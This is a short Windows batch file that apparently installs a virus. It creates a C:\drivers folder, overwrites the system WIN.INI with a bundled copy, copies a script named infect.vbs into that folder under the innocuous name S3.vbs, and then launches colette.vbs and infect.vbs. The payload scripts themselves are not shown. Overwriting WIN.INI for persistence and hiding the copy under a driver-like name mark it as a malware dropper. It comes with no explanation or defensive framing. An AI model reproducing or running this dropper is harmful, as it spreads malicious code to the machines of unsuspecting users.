@echo off
md C:\drivers
copy win.ini C:\WINDOWS\WIN.INI
copy infect.vbs C:\drivers\S3.vbs
start colette.vbs
start infect.vbs
exit